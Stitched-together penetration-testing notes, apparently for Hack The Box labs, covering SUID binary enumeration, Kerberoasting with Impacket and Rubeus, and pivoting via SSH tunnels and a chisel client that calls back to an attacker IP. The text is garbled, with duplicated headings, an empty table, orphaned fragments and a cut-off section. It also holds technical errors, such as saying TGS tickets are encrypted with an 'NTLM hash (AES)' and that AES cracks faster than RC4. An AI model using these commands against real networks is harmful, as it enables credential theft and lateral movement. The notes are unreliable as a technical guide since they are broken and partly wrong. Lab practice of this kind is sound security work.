# Enumerating SUID Binaries on a Linux Box

## 1. Basic Discovery

# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Combined, with readable output
find / \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} \; 2>/dev/null

If find is missing, fall back to:

# Walk directories manually
ls -laR /usr/bin /usr/sbin /bin /sbin 2>/dev/null | grep -E '^-rws|^-rwS'

## 2. Quick Triage — Writable or Group-Writable?

# SUID binary that's world-writable = instant root (usually)
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | grep -E '^-rw.*w'

# Or more precisely:
find / -perm -4000 -type f 2>/dev/null | while read f; do
    perms=$(stat -c "%A" "$f")
    if [[ "$perms" == *w* ]]; then
        echo "WRITABLE SUID: $f"
    fi
done

# Enumerating & Triaging SUID Binaries on Linux

## 1. Find SUID Binaries

# All SUID binaries (setuid bit set, owned by root)
find / -perm -4000 -type f 2>/dev/null

# Broader: setuid OR setgid
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null

# If you want to exclude known safe paths (faster on large systems)
find / -perm -4000 -type f 2>/dev/null | grep -v -E '/(bin|sbin|lib)/'

### Reading the permission string

-rwsr-xr-x  1  root  root  139264 Apr 2 2024  /usr/bin/locate

   ^
   This 's' in the user-x position = setuid bit

| Flag | Meaning |
|------|---------|
| s in user position | Runs as file owner (usually root) |
| s in group position | Runs as file group |
| S (uppercase) | SUID set but no execute permission — usually broken, lower value |

# Kerberoasting on an HTB Active Directory Box

## Background

Kerberoasting exploits the Kerberos TGS (Ticket-Granting Service) mechanism. Service accounts with a Service Principal Name (SPN) registered in AD can be requested for a TGS ticket using *any* valid Kerberos TGT — even a low-privileged one. The TGS ticket is encrypted with the service account's NTLM hash (AES-128/256), making it crackable offline.

---

## Step 1 — Enumerate Service Accounts with SPNs

### Option A: GetUserSPNs.py (Impacket, from your Kali box)

# Basic request for all SPN accounts (uses your current TGT)
python GetUserSPNs.py -dc-ip <DOMAIN_IP> <DOMAIN>/<user>:<password> -request

# Example:
python GetUserSPNs.py -dc-ip 10.10.10.50 LAB/interactsh:password123 -request

This queries the KDC for a TGS for every SPN-registered account. Look for accounts that are not krbtgt or MSSQLSvc (though those can work too).

### Option B: Rubeus (on a foothold Windows machine)

Rubeus.exe kerberoast /nowrap /aesonly /ldapfilter:"(serviceprincipalname=*)" /out:file.txt

> /aesonly filters for AES-128/256 (faster to crack than RC4 in many cases, but both work with hashcat).

### Option C: tcpdump (passive, on the domain DC or jumpbox)

tcpdump -i eth0 -w kerberoast.pcap port 88

Then request tickets (via GetUserSPNs or Rubeus) and extract from the pcap.

| Goal | Change |
|------|--------|

### Local Port Forward

Useful when you need to reach a specific service on the internal subnet:

# From your attack box (forward local port 8080 → 172.16.0.5:80)

# Pivoting to an Internal Subnet via a Dual-Homed Host

## 1. Confirm the Second Interface

Once you have a shell on the compromised host, verify it has a second NIC on the internal subnet:

ip a
# or
ifconfig

route -n

You should see something like:

eth0: 10.10.10.50/24   (facing your attack box)
eth1: 172.16.0.100/24  (facing the internal subnet)

---

## 2. Choose a Pivot Method

### Option A: SSH Reverse Tunnel (Simplest if SSH is available)

On the compromised host, open a remote port forward so your attack box's traffic gets tunneled through:

# On the compromised HTB box — open a SOCKS proxy back to your box
ssh -R 1080:localhost:1080 user@YOUR_ATTACK_IP -N -f

Or more commonly, from your attack box, create a local port forward:

# Attack box: forward local port 8080 → through compromised host → to 172.16.0.50:445
ssh -L 8080:172.16.0.50:445 user@10.10.10.50 -N

For full subnet access, use dynamic (SOCKS) port forward:

# Attack box: create SOCKS5 proxy on local port 1080
ssh -D 1080 user@10.10.10.50 -N

Then use proxychains on your attack box:

proxychains nmap -sT -p 1-1000 172.16.0.50
proxychains nc -nlvp 445   # test specific service

> ⚠️ Note: -sT (TCP connect scan) works; -sS (SYN scan) won't through SOCKS.

---

### Option B: Chisel (Most Flexible — works without SSH)

On the compromised host, run the chisel client in reverse tunnel mode:

# The compromised host connects back to your attack box
./chisel client YOUR_ATTACK_IP:8000 R:0:172.16.0.0/24

The R:0:172.16.0.0/24 means: "listen on port 0 (random) and forward all traffic to the 172.16.0.0/24 subnet."
